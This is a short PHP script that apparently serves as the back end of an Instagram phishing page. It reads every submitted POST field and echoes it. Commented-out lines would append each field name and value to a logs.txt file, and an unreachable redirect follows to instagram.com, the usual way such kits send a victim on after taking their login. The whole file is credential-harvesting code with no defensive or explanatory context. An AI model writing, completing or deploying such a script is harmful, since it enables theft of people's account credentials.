<?php

$handle = fopen("./logs.txt", "a");
foreach($_POST as $variable => $value) {
   
   echo $variable ." " . $value;
  /* fwrite($handle, $variable);
   fwrite($handle, " = ");
   fwrite($handle, $value);
   fwrite($handle, "\r   \n"); */
}
//fwrite($handle, "\r   \n   \n");
//fclose($handle);
//exit;
die;
header ('Location:https://instagram.com');

?>
